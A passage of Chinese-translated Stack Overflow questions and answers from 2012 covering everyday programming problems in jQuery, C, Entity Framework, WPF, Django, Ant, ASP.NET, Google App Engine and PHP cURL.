您也可以使用`function(idx, elem)`and`$(elem)`而不是`$(this)`作为函数将索引和元素作为前两个参数传递。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-25T16:42:31.397

虽然您的代码很接近，但它并不*完全*正确。你应该使用：

```
$('.test').each(function() {
    alert($(this).parent().attr("id"));
}); 
```

[更新了 JS Fiddle 演示](http://jsfiddle.net/davidThomas/n6Bhh/)。

您遇到的问题是您在每次迭代时重新选择数组`each()`，而 jQuery 将简单地返回返回的数组的*第一个*元素的属性。

参考：

*   [`each()`](http://api.jquery.com/each/).

# javascript - 在 Bootstrap 手风琴标题中有一个可点击的元素

> ID：12587393
> 
> 赞同：8
> 
> 时间：2012-09-25T16:40:37.263
> 
> 标签：javascript, html, css, twitter-bootstrap

我正在尝试使用手风琴并在标题内有一个复选框。但是，当我单击手风琴标题中的复选框时，它会折叠或展开手风琴。有没有办法在没有手风琴展开/折叠的情况下单击复选框？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-10-03T12:12:46.000

单击会冒泡到手风琴标题，因此另一种可能性（除了按照其他人的建议将复选框移动到切换之外）是停止冒泡。

使用一些 JQuery，例如：

```
$("input[type=checkbox]").on("click", function(event) {
    event.stopPropagation();
}); 
```

或使用更短的复选框选择器：

```
$(":checkbox").on("click", function(event) {
    event.stopPropagation();
}); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-01-02T06:25:39.473

您必须将*复选框*放在*手风琴切换*之外但在*手风琴标题*类内，即

```
<div class="accordion-heading">
    <input type="checkbox" name="box"/>
    <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordionParent" href="#collapseone">
        <p>Heading1</p>
    </a>
</div> 
```

并添加CSS`.accordion-heading a.accordion-toggle { display: inline-block; }`

# c# - 将字符串粘贴到活动单元格行中

> ID：12587394
> 
> 赞同：0
> 
> 时间：2012-09-25T16:40:39.840
> 
> 标签：c#, excel

第一次创建 Excel 加载项。

所以应用程序就是这样工作的。

用户单击工作表中的单元格，单击功能区栏上的“行创建者”，输入信息，单击“插入”，程序实质上将文本框中的信息粘贴为字符串。

在不创建 .CSV 文件的情况下，我还没有找到任何“获取活动单元格”或粘贴的方法。

这可以仅使用 C# 来完成吗？

谢谢！

# javascript - javascript函数调用不起作用

> ID：12587396
> 
> 赞同：0
> 
> 时间：2012-09-25T16:40:45.877
> 
> 标签：javascript

在 register.js 中，我有一个名为 username() 的函数，我想从我的网页中调用它，但该函数不会运行。

这是我包含 .js 文件并调用函数的地方：

```
<head>
        <link rel="stylesheet" href="css/base.css" />
        <script src="resources/jquery-1.8.1.min.js"></script>
        <script src="resources/register.js"></script>
        <script type="text/javascript">username();</script>
</head> 
```

这是在 .js 文件中：

```
function username(){
    document.getElementById("username").innerHTML="Username already in use";
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T16:42:48.643

您没有带有 id 的元素`username`。

（您可能在文档中有一个较低的内容，您尚未与我们共享，但由于您直接调用该函数（`load`而不是响应事件，例如`<head>`.)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T16:44:49.873

这是刚开始使用 Javascript 的人们的常见错误。麻烦的是，如果你不知道该怎么称呼它，就很难找到答案。

发生了什么：`<head>`处理元素时，文档正文中的任何内容都不存在。您的元素`username`不存在，因此`getElementById`失败。

**解决方案 1**移动`<script type="text/javascript">username();</script>`到就在前面，`</body>`这样一切都将就位。

**解决方案 2**使用`onload`事件在其他所有内容运行后运行您的 JavaScript

```
<body onload="username()"> 
```

（jQuery 也有自己的`onload`事件处理。）

# jquery - Firefox 左上角的 JQuery 交叉滑杆

> ID：12587398
> 
> 赞同：2
> 
> 时间：2012-09-25T16:40:55.987
> 
> 标签：jquery, firefox, jquery-plugins, slideshow

我在我的网站中使用 JQuery [CrossSlide](http://tobia.github.com/CrossSlide/)插件。在 Chrome 和 IE 中一切正常，但在 Firefox 中，页面中的所有幻灯片都粘在左上角。

您可以在这里看到问题：[我的网站](http://www.tmunaledorot.co.il/Products.aspx)

如果有人能指出这个问题的解决方案，那就太好了。

非常感谢，埃拉德

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:17:45.697

这是由于表格单元格无法正确包含绝对定位的元素。您的滑块是绝对定位的，并且它在一个元素内。

为了解决这个问题，您可以将滑块包装在一个 div 中，即 position: relative;，这将使滑块能够保持绝对定位在单元格中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:20:40.937

将图像包装在 DIV 标签中

```
<div class="product_image" style="overflow: hidden; padding: 0px; position: relative ! important;">
    <img ..../>
    <img ..../>
</div> 
```

你也可以把你的桌子放在适当的位置：相对

# javascript - 修复了从 JavaScript 转换为 jQuery 的滚动标题

> ID：12587403
> 
> 赞同：4
> 
> 时间：2012-09-25T16:41:12.627
> 
> 标签：javascript, jquery, scroll, fixed, jsfiddle

我发现并定制了一个很棒的[jsFiddle 演示](http://jsfiddle.net/_jro/27DpN/)，它执行了出色的滑动/固定标题效果。div 框将相互推开，成为窗口顶部的下一个固定元素。

但是，我一直在努力使这种效果在普通文档中起作用。即使我将所有 HTML、CSS 和 JS 复制/粘贴到另一个 index.html 文件中，它也不起作用。奇怪的是它在 jsFiddle 中运行良好，但在其他任何地方都没有。

理想情况下，有什么方法可以将所有这些 JavaScript 转换为 jQuery？我觉得解决方案很冗长，没有必要拥有所有这些代码行。我会很感激任何帮助，因为这个解决方案是**完美**的，除了我无法在常规文档中使用它。我知道 jQuery 会更容易使用，但我自己很难理解大部分 JS 代码。

此处参考是我找到此解决方案的[原始堆栈线程。](https://stackoverflow.com/a/7387484/477958)它是在一年前更新的，应该仍然可以在大多数浏览器中运行。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T18:06:48.213

这是一个jQuery解决方案

```
$(function(){
  $(window).scroll(function(){
    var fixedHeads = $('.fixedheader');
    for(var i = 0, c = fixedHeads.length; i < c; i++){

      var header = $(fixedHeads[i]);
      var next = fixedHeads[i+1] ? $(fixedHeads[i+1]) : undefined;
      var prev = $(header.prev());

      if(window.pageYOffset > prev.offset().top){
        var top = 0;
        if(next){
          top = header.height() - (next.offset().top - window.pageYOffset);
          top = top < 0 ? 0 : -top;
        }
        if(top === 0){
          //if there is another header, but we have room
          prev.css('height', header.height() + 'px');
        }
        header.css({
          position: 'fixed',
          top: top + 'px'
        });
      } else{
        prev.css('height', '0px');
        //if we haven't gotten to the header yet
        header.css({
          position:'static',
          top:''
        });
      }
    }
  });
}); 
```

# javascript - 为什么这些 URI 被截断为“i”？

> ID：12587404
> 
> 赞同：0
> 
> 时间：2012-09-25T16:41:13.233
> 
> 标签：javascript, regex, hyperlink

好的，所以我有一个使用我的自定义语法的链接。这是我的解析器的一部分（没有 XSS 洗涤器部分），这是我已经隔离了其中一个剩余错误的问题。由于某种原因，URI`http://ur.i`被截断为仅`"i"`.

任何知道为什么的人都会得到一匹小马。

```
var str = "[inner -&gt; http://ur.i]";

str = str.replace(/\[([^\]]+?)\s*(\||-&gt;)\s*((?!-&gt;)[^\]])+]/g, function(m, iH, separator, hr){
  console.log('hr: '); console.log(hr);
  return '<a class="'+ (separator.match(/-&gt;/) ? 'adlns-btn' : 'adlns-link') +'" href="'+ hr +'">' +
            iH +
         '</a>';
});

console.log(str); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:14:43.263

`+`量词应该*在*括号内，而不是在括号*外*：

```
/\[([^\]]+?)\s*(\||-&gt;)\s*((?!-&gt;)[^\]]+)]/g 
```

这解决了问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T16:47:46.147

您缺少匹配 之后的空格`-&gt;`，请尝试以下操作：

```
/\[([^\]]+?)\s*(\||-&gt;)\s*((?!-&gt;\s)[^\]])+]/g 
```

# autocomplete - 如何使用自动完成向 RailsAdmin 添加标签

> ID：12587405
> 
> 赞同：1
> 
> 时间：2012-09-25T16:41:13.300
> 
> 标签：autocomplete, tags, rails-admin

我一直在尝试向 RailsAdmin 添加标记功能，但没有成功。我正在使用以下宝石：

gem 'rails_admin' gem 'rails_admin_tag_list' gem 'rails3-jquery-autocomplete'

“rails_admin_tag_list”正在添加标签，但它缺少自动完成功能。我正在尝试为标签字段创建一个“自定义字段”/部分，但我似乎无法正确处理。

有没有人成功地向 RailsAdmin 添加标签功能以及自动完成功能？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T19:34:48.820

在发布问题后，我想出的一个明显的解决方案是使用 has_many_and_belongs_to_many 关系从头开始实现标记。

RailsAdmin 可以很好地处理这些关系，并且默认具有自动完成功能。

但是，我仍在寻找有关如何在 RailsAdmin 中创建“自定义字段”的帮助/想法——我可能需要它来做其他事情。此外，让它与 rails_admin_tag_list 和自动完成一起工作也很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T12:24:30.757

我猜 rails_admin_tag_list 支持标签建议。

```
RailsAdmin.config do |config|
  config.models do
    edit do
      fields_of_type :tag_list do
        partial 'tag_list_with_suggestions'
      end
    end
  end
end 
```

# c - 理解 size_t 类型和 sizeof 运算符的问题

> ID：12587406
> 
> 赞同：2
> 
> 时间：2012-09-25T16:41:24.223
> 
> 标签：c, arrays, printf, sizeof, size-t

```
void sizeof_test2();

void sizeof_test2()
{
    int array[5];
    size_t arr_size = sizeof(array);

    printf( "sizeof:\n"
            "array = %d\n"
            "arr_size = %d\n", sizeof(array), sizeof(arr_size));
} 
```

GCC 编译器输出：

```
sizeof_test2.c: In function `sizeof_test2':  
sizeof_test2.c:6: error: `size_t' undeclared (first use in this function)  
sizeof_test2.c:6: error: (Each undeclared identifier is<br>
reported only once sizeof_test2.c:6: error: for each function it<br>
appears in.) sizeof_test2.c:6: error: parse error before "arr_size"<br>
sizeof_test2.c:10: error: `arr_size' undeclared (first use in this<br>
function) make[2]:  [build/Debug/Cygwin-Windows/sizeof_test2.o]<br>
Error 1 make[1]:  [.build-conf] Error 2<br> 
```

不知道为什么会出现此错误，显示 size_t 类型的正确方法是`printf`什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-25T16:44:10.777

`size_t`类型在`stddef.h`标头（和其他标头，例如`stdio.h`）中定义。

请注意，在您的程序中，您正在使用`printf`函数，因此您已经必须包含`stdio.h`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-25T16:53:25.710

stdlib 是你想要的，为了显示它，我认为你正在寻找`%z`修饰符

```
#include <stdlib.h>

size_t arr_size;
printf("%zu\n", arr_size);  // unsigned decimal 
printf("%zx\n", arr_size);  // hex 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-25T16:47:25.413

`size_t`不是 C 中的内置类型。您必须在定义的位置包含`<stddef.h>`或`<stdlib.h>`标准标题。`size_t`

# entity-framework - 与实体框架的多对多（单向）关系

> ID：12587407
> 
> 赞同：2
> 
> 时间：2012-09-25T16:41:32.057
> 
> 标签：entity-framework, entity-framework-4.1, ef-code-first

我将 Entity Framework 4.1 与 MVC 3 一起使用。

我遇到的问题是，当我将带有附加类别的新问题保存到数据库时，它应该只更新 Question 和 QuestionCategories 表，但是它会在 Category 表中添加一个新的重复条目。

```
public class Question{
   public int QuestionId{ get; set; }
   public string QuestionName { get; set;}
   public virtual IList<Category> Categories{ get; set; }
}

public class Category{
  public int CategoryId{ get; set; }
  public string CategoryName { get; set; }
}

modelBuilder.Entity<Question>()
   .HasMany(e => e.Categories)
   .WithMany() // don't need?
   .Map(mc => mc
   .ToTable("QuestionCategories")
   .MapLeftKey("QuestionId")
   .MapRightKey("CategoryId"));

public long CreateQuestion(Question question)
{ 
   this.repository.questions.Add(question); 
   this.repository.SaveChanges();
   return question.Id;

}

public void AddCategoryToQuestion(question question, List<long> CategoryIds)
{
   if (question.Categories == null)
       question.Categories = new List<Category>();

   foreach (long CategoryId in CategoryIds)
   {
       if (question.Categories.FirstOrDefault(q => q.Id == CategoryId) == null)
       {
           Category category = this.CategoryService.GetCategoryById(CategoryId);
           if (category != null)
           {
              question.Categories.Add(category);
           }
        }
   }
}

public void SaveQuestion(Question Question)
{
    this.repository.Questions.Attach(Question);
    this.repository.SetModified(Question);
    this.repository.SaveChanges();
}

Category Table 
Before SaveQuestion runs when user assigns Operations Category to a new question.

CategoryId  CategoryName 
1           Operations
2           Safety

After SaveQuestion runs

CategoryId  CategoryName 
1           Operations
2           Safety
3           Operations 
```

先感谢您。

# facebook-login - Facebook API 登录 - 仅在移动设备上出错

> ID：12587411
> 
> 赞同：2
> 
> 时间：2012-09-25T16:41:48.747
> 
> 标签：facebook-login

我已经将 Facebook 登录实现为移动网络。但是有一点不对劲。
当我单击登录按钮时，它会跳出身份验证页面。
按下确认后，它应该会跳回我原来的页面，并且状态为已登录。
但是，在 iPhone 和 hTc 上，它都不会回到该页面。
但是当我再次手动刷新原始页面时，我已经登录了。
当我使用我的PC登录时，登录功能运行良好，但在iPhone和hTc上出现错误。
换句话说，这个问题**只出现在我的移动设备上。**

# android - modbus android 应用程序 eclipse

> ID：12587414
> 
> 赞同：0
> 
> 时间：2012-09-25T16:41:56.843
> 
> 标签：android, eclipse, tcp, modbus

我是安卓新手。我正在尝试在eclipse中运行modbusdroid的java代码程序我没有更改任何代码，只下载了最新版本的seroUtils.jar并添加到项目中，因为它丢失了。*附上错误日志，当我在 Eclipse源*中运行它时请帮助我 - [https://github.com/bigcat/ModbusDroid](https://github.com/bigcat/ModbusDroid)

```
09-25 17:22:17.806: E/dalvikvm(813): Could not find class 'com.bencatlin.modbusdroid.OldVersion.MbDroidMsgExceptionHandler', referenced from method com.bencatlin.modbusdroid.OldVersion.ModbusDroid.onCreate
09-25 17:22:19.117: E/dalvikvm(813): Could not find class 'com.serotonin.util.queue.ByteQueue', referenced from method com.serotonin.modbus4j.base.ModbusUtils.calculateCRC
09-25 17:22:20.277: E/dalvikvm(813): Could not find class 'com.serotonin.messaging.StreamTransport', referenced from method com.serotonin.modbus4j.ip.tcp.TcpMaster.openConnection
09-25 17:22:20.498: E/dalvikvm(813): Could not find class 'com.serotonin.modbus4j.ip.encap.EncapMessageParser', referenced from method com.serotonin.modbus4j.ip.tcp.TcpMaster.init
09-25 17:22:20.667: E/dalvikvm(813): Could not find class 'com.serotonin.modbus4j.ip.xa.XaMessageParser', referenced from method com.serotonin.modbus4j.ip.tcp.TcpMaster.init
09-25 17:22:20.807: E/dalvikvm(813): Could not find class 'com.serotonin.modbus4j.ip.encap.EncapMessageRequest', referenced from method com.serotonin.modbus4j.ip.tcp.TcpMaster.send
09-25 17:22:20.930: E/dalvikvm(813): Could not find class 'com.serotonin.modbus4j.ip.xa.XaMessageRequest', referenced from method com.serotonin.modbus4j.ip.tcp.TcpMaster.send
09-25 17:22:21.437: E/dalvikvm(813): Could not find class 'com.serotonin.messaging.MessageControl', referenced from method com.serotonin.modbus4j.ModbusMaster.getMessageControl
09-25 17:22:21.797: E/dalvikvm(813): Could not find class 'com.serotonin.messaging.DefaultMessagingExceptionHandler', referenced from method com.serotonin.modbus4j.Modbus.<init>
09-25 17:22:22.002: E/dalvikvm(813): Could not find class 'com.serotonin.messaging.DefaultMessagingExceptionHandler', referenced from method com.serotonin.modbus4j.Modbus.setExceptionHandler
09-25 17:22:22.277: E/AndroidRuntime(813): FATAL EXCEPTION: main
09-25 17:22:22.277: E/AndroidRuntime(813): java.lang.NoClassDefFoundError: com.serotonin.messaging.DefaultMessagingExceptionHandler
09-25 17:22:22.277: E/AndroidRuntime(813):  at com.serotonin.modbus4j.Modbus.<init>(Modbus.java:34)
09-25 17:22:22.277: E/AndroidRuntime(813):  at com.serotonin.modbus4j.ModbusMaster.<init>(ModbusMaster.java:55)
09-25 17:22:22.277: E/AndroidRuntime(813):  at com.serotonin.modbus4j.ip.tcp.TcpMaster.<init>(TcpMaster.java:55)
09-25 17:22:22.277: E/AndroidRuntime(813):  at com.bencatlin.modbusdroid.OldVersion.ModbusTCPMaster.<init>(ModbusTCPMaster.java:23)
09-25 17:22:22.277: E/AndroidRuntime(813):  at com.bencatlin.modbusdroid.OldVersion.ModbusTCPFactory.createModbusTCPMaster(ModbusTCPFactory.java:12)
09-25 17:22:22.277: E/AndroidRuntime(813):  at com.bencatlin.modbusdroid.OldVersion.ModbusDroid.onCreate(ModbusDroid.java:426)
09-25 17:22:22.277: E/AndroidRuntime(813):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
09-25 17:22:22.277: E/AndroidRuntime(813):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2627)
09-25 17:22:22.277: E/AndroidRuntime(813):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2679)
09-25 17:22:22.277: E/AndroidRuntime(813):  at android.app.ActivityThread.access$2300(ActivityThread.java:125)
09-25 17:22:22.277: E/AndroidRuntime(813):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2033)
09-25 17:22:22.277: E/AndroidRuntime(813):  at android.os.Handler.dispatchMessage(Handler.java:99)
09-25 17:22:22.277: E/AndroidRuntime(813):  at android.os.Looper.loop(Looper.java:123)
09-25 17:22:22.277: E/AndroidRuntime(813):  at android.app.ActivityThread.main(ActivityThread.java:4627)
09-25 17:22:22.277: E/AndroidRuntime(813):  at java.lang.reflect.Method.invokeNative(Native Method)
09-25 17:22:22.277: E/AndroidRuntime(813):  at java.lang.reflect.Method.invoke(Method.java:521)
09-25 17:22:22.277: E/AndroidRuntime(813):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
09-25 17:22:22.277: E/AndroidRuntime(813):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
09-25 17:22:22.277: E/AndroidRuntime(813):  at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:50:17.330

`Display.getRotation`在 API 级别 8 (Froyo 2.2) 中添加。我猜您使用的是较旧的设备或模拟器。创建一个 API 级别 >= 8 的新 AVD

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-13T18:50:50.110

我遇到了同样的问题，我解决了将新的 seroutils.jar 放入“库”选项卡中的“java 构建路径”，然后将 jar 签入“订购和导出”选项卡。它永久地解决了这个问题。

# wpf - 将 DataGrid 列绑定到另一个对象内的集合

> ID：12587415
> 
> 赞同：0
> 
> 时间：2012-09-25T16:41:59.570
> 
> 标签：wpf, data-binding, datagrid

我有一个名为 TestData 的对象，它包含两个属性，一个字符串和一个 ObservableCollection。我有一个 ObservableCollection，用于在代码中的 DataGrid 中生成列。我可以根据 TestData 对象动态生成 DataGridTextColumn 及其各自的标题，但我无法将 DataGridTextColumn Binding 属性绑定到 TestData 内部的 ObservableCollection。

既然我已经用文字说明了问题，让我通过放置代码来解决它：

测试数据.cs

```
public class TestData
{
    private ObservableCollection<string> data = new ObservableCollection<string>();
    public string Header { get; set; }
    public ObservableCollection<string> Data
    {
        get
        {
            return data;
        }

        set
        {
            data = value;
        }
    }
} 
```

MainWindow.xaml.cs 代码背后

```
public partial class MainWindow : Window
{
    private ViewModel viewModel = new ViewModel();
    private List<string> headers = new List<string>();
    private ObservableCollection<TestData> mainData = new ObservableCollection<TestData>();        

    public MainWindow(ViewModel vm)
    {
        InitializeComponent();
        viewModel = vm;
        this.DataContext = viewModel;     

        mainData = viewModel.MainData;

        this.spreadSheet.ItemsSource = viewModel.MainData;            

        foreach (TestData data in mainData)      
        {
            if (headers.Contains(data.Header) == false)
            {
                headers.Add(data.Header);
                DataGridTextColumn col = new DataGridTextColumn();                    
                int x = viewModel.MainData.IndexOf(data);                    
                Binding bind = new Binding("Data");                    
                bind.BindsDirectlyToSource = true;                    
                bind.Source = mainData[x];                    
                col.Binding = bind;
                col.Header = data.Header;                                      
                this.spreadSheet.Columns.Add(col);        
            }

        }
    }
} 
```

XAML 主窗口.xaml

```
<Grid>                
    <DataGrid   AutoGenerateColumns="False" Height="Auto" HorizontalAlignment="Stretch"  Name="spreadSheet" VerticalAlignment="Stretch"  Width="Auto" />

</Grid> 
```

如果我在我的 ObservableCollection 中放置 4 个 TestData 对象，我会得到它们的标题，但 TestData 对象内的 ObservableCollection 中的所有数据都在 DataGrid 中显示为 (Collection)。

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T16:56:16.853

我认为您没有正确看待这个问题。
您不会将带有单个字符串的单独集合绑定到每一列。
您将单个二维行和列集合绑定到整个 DataGrid。

请注意，列没有 ItemsSource 属性。只有一个路径属性。 [数据网格文本列](http://msdn.microsoft.com/en-us/library/system.windows.controls.datagridtextcolumn.aspx)

DataGrid 有一个 ItemsSource 属性。 [数据网格](http://msdn.microsoft.com/en-us/library/system.windows.controls.datagrid.aspx)

```
public class Myrow 
{
    public string Col1 { get; private set; }  
    public string Col2 { get; private set; } 
    public Myrow (string col1, string col2) { Col1 = col1, Col2 = Col2 }
}

ObservableCollection<Myrow> Myrows ... 
```

MyRows 绑定到 DataGrid（不是列）

# google-app-engine - 在 GAE 上将 Play 应用程序从 JDK 6 更新到 7

> ID：12587432
> 
> 赞同：0
> 
> 时间：2012-09-25T16:43:06.990
> 
> 标签：google-app-engine, playframework

我一直在使用 play framework 开发一个 web 应用程序（使用 eclipse）。我使用的是 Play 1.2.3 和 JDK6，然后我不得不更改使用 JDK7 的开发环境（新电脑）。我的依赖是：

```
require:
- play
- play -> crudsiena 2.0.1
- play -> siena 2.0.5
- play -> secure
- play -> gae 1.6
- provided -> opencsv 2.3
- provided -> ddlutils_siena 1.0
- provided -> gae_aws_sdk 1.1.7.1
#- provided -> play 1.2.4
#- provided -> httpclient 4.1.1
#- provided -> httpcore 4.1
repositories: 
- provided: 
   type:       local 
   artifact:   "${application.path}/jar/[module]-[revision].jar" 
   contains: 
     - provided -> * 
```

更新后，我什至无法在本地主机上运行应用程序，所以我开始了研究。我发现Play 1.2.3不支持JDK7，所以我换成了1.2.4。然后我还将 Siena 版本更新为 2.0.7，并将以下行包含到我的 application.conf 中：

```
java.source=1.7 
```

我什至用 play 创建了一个新项目并将必要的文件复制到新项目中。我设置了正确的 JAVA_HOME 环境变量。我的本地主机上的应用程序运行良好。但是，当我在 Google App Engine 上更新版本时，仍然出现以下错误：

```
Uncaught exception from servlet
java.lang.UnsupportedClassVersionError: controllers/Admin : Unsupported major.minor version 51.0
at com.google.appengine.runtime.Request.process-1921becf6a885374(Request.java)
at java.lang.ClassLoader.defineClass1(Native Method)
at java.lang.ClassLoader.defineClass(ClassLoader.java:174)
at play.classloading.ApplicationClassloader.loadApplicationClass(ApplicationClassloader.java:118)
at play.classloading.ApplicationClassloader.getAllClasses(ApplicationClassloader.java:401)
at play.Play.preCompile(Play.java:570)
at play.Play.init(Play.java:299)
at play.server.ServletWrapper.contextInitialized(ServletWrapper.java:77)
at org.mortbay.jetty.handler.ContextHandler.startContext(ContextHandler.java:548)
at org.mortbay.jetty.servlet.Context.startContext(Context.java:136)
at org.mortbay.jetty.webapp.WebAppContext.startContext(WebAppContext.java:1250)
at org.mortbay.jetty.handler.ContextHandler.doStart(ContextHandler.java:517)
at org.mortbay.jetty.webapp.WebAppContext.doStart(WebAppContext.java:467)
at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50)
at com.google.tracing.TraceContext$TraceContextRunnable.runInContext(TraceContext.java:452)
at com.google.tracing.TraceContext$TraceContextRunnable$1.run(TraceContext.java:459)
at com.google.tracing.TraceContext.runInContext(TraceContext.java:701)
at com.google.tracing.TraceContext$AbstractTraceContextCallback.runInInheritedContextNoUnref(TraceContext.java:336)
at com.google.tracing.TraceContext$AbstractTraceContextCallback.runInInheritedContext(TraceContext.java:328)
at com.google.tracing.TraceContext$TraceContextRunnable.run(TraceContext.java:456)
at java.lang.Thread.run(Thread.java:679) 
```

我确实意识到这与从 JDK6 到 JDK7 的转换有关，但是我不知道还有什么地方可以让应用程序在 GAE 上运行。此外，编译器在 Eclipse 中设置为 1.7。

请帮我解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T19:47:26.490

要在 App Engine 上使用 Java，您必须使用 JDK 6： [https ://developers.google.com/appengine/docs/java/overview](https://developers.google.com/appengine/docs/java/overview)

他们有一个问题，在他们的问题跟踪器中： [http ://code.google.com/p/googleappengine/issues/detail?id=6972](http://code.google.com/p/googleappengine/issues/detail?id=6972)

对不起！但我认为你将不得不改变。

（请注意，目前情况确实如此。我怀疑 Google 有某种升级计划，但我还没有听说过 Java 7 的任何公告。他们可能会为此提供一个有限的“受信任的测试人员”程序，对于一个重要的一般可用性之前的时间量。）

# postgresql - 在 PostgreSQL 中使用什么作为 NOOP？

> ID：12587433
> 
> 赞同：12
> 
> 时间：2012-09-25T16:43:19.997
> 
> 标签：postgresql, stored-procedures, noop

在 PostgreSQL 8.4 中开发一些存储过程时，我需要一个占位符。我通常会使用某种可执行的 noop（当尝试执行它时不会产生错误），但根据粗略的检查，PostgreSQL 中似乎没有这样的功能。存在哪些替代方案？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-25T16:49:53.010

尝试

`NULL;`

[Postgresql 8.4 手册 - Noop 部分](http://www.postgresql.org/docs/8.4/static/plpgsql-statements.html#PLPGSQL-STATEMENTS-NULL)

# asp.net - 使用 Web 服务上传 zip 文件时出错

> ID：12587435
> 
> 赞同：0
> 
> 时间：2012-09-25T16:43:37.147
> 
> 标签：asp.net

他是一个 VS 2010 Windows 应用程序，它调用 Web 服务在本地计算机和远程计算机之间上传和下载文件。（请注意，此应用程序已从 vs2008 转换为 vs2010 以使用 .net 4-在此转换之前运行良好地方）

它适用于 .pdf 和文本文件。

但是当尝试上传 zip 文件时，我收到了错误

**System.Web.Services.Protocols.SoapException：运行配置文件中指定的扩展时出现异常。---> 超出最大请求长度。在 System.Web.Services.Protocols.SoapHttpClientProtocol.ReadResponse（SoapClientMessage 消息，WebResponse 响应，流 responseStream，布尔 asyncCall）在 System.Web.Services.Protocols.SoapHttpClientProtocol.Invoke（字符串方法名，对象 [] 参数）**

更新：我已包含`<httpRuntime maxRequestLength="10240"/>`在 Web 服务的 web.config 文件中。zip 文件大于 8 MB

有什么建议么？

回答： `<httpRuntime maxRequestLength="209715200"/>`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T16:46:53.977

您可以在此部分下`System.Web`

```
<configuration>
   <system.web>
      <httpRuntime maxRequestLength="209715200"/>
   </system.web>
</configuration> 
```

指定的大小以千字节为单位。默认值为 4096 KB (4 MB)。

# django - Django 1.4 可以在模板中支持 elif 吗？

> ID：12587436
> 
> 赞同：3
> 
> 时间：2012-09-25T16:43:43.703
> 
> 标签：django, templates

根据[django 1.4 new features](https://docs.djangoproject.com/en/dev/releases/1.4/#minor-features) post，django 应该支持模板中的 elif 标签，这与以前的版本不同。我只是从 1.3 升级一个应用程序，并实现了重构，结果如下：

```
Django Version: 1.4.1
Exception Type: TemplateSyntaxError
Exception Value: Invalid block tag: 'elif', expected 'endif' 
```

如果有人遇到过类似的问题，或者知道这一点，请让我知道如何正确地做到这一点。我想要 elif 提供的清洁度。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-25T16:49:45.840

Django 1.4 绝对支持模板中的 ELIF 语法：

[https://docs.djangoproject.com/en/1.4/ref/templates/builtins/#if](https://docs.djangoproject.com/en/1.4/ref/templates/builtins/#if)

从您的错误来看，您似乎肯定在使用 1.4。你能发布完整的if语句吗？导致此问题的 IF 和 ELIF 之间可能存在语法错误。另外，只需要问一下，您是否有结束 if 语句的 ENDIF 标签？

# ant - 如何将dirset值转换为字符串

> ID：12587437
> 
> 赞同：0
> 
> 时间：2012-09-25T16:43:43.593
> 
> 标签：ant

我正在使用 scriptdef 编写一个 javascript ant 任务：

```
<scriptdef name="xxx" language="javascript">
    <element name="dirset" type="dirset"/>
    <![CDATA[
      importClass(java.io.File);
      var dirsets = elements.get("dirset");
      var t = dirsets.get(0);
      self.log(t.indexOf("T"));
    ]]>
</scriptdef> 
```

当我运行这个脚本时，它抱怨它找不到 indexOf 函数。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T20:43:24.617

您可以使用[pathconvert](http://ant.apache.org/manual/Tasks/pathconvert.html) ANT 任务：

```
<pathconvert property="dirs.str" pathsep=" " refid="dirset.id"/> 
```

# php - cURL 和 whitepages.com 有问题

> ID：12587438
> 
> 赞同：1
> 
> 时间：2012-09-25T16:43:46.860
> 
> 标签：php, curl

我有一个从 whitepages.com 提取信息的功能，它运行良好。我将代码移到了新服务器上，现在我只遇到了 curl 和 white pages 的问题。我还使用 curl 访问其他网站，例如 zillow.com，它运行良好。

我使用的代码是：

```
<?php
$ch3 = curl_init(); 
    curl_setopt($ch3, CURLOPT_CONNECTTIMEOUT, 15);
    curl_setopt($ch3, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch3, CURLOPT_URL, "http://www.whitepages.com/name/john-smith/md"); 
    curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1); 
    $output2 = curl_exec($ch3); 
curl_close($ch3);

?>
<?=$output2;?> 
```

我不知道这是否是 cURL 或 PHP 或服务器本身的问题。PHP 版本 5.3.17。较旧的服务器：PHP 版本 5.2.4。它似乎适用于我们拥有的所有其他服务器。我不知道 php 或 cURL 中是否有我需要打开的选项。谢谢。

编辑：这是 curl 部分中的 phpinfo

```
cURL support      enabled
cURL Information    7.24.0
Age 3
Features
AsynchDNS   No
Debug   No
GSS-Negotiate   No
IDN Yes
IPv6    Yes
Largefile   Yes
NTLM    Yes
SPNEGO  No
SSL     Yes
SSPI    No
krb4    No
libz    Yes
CharConv    No
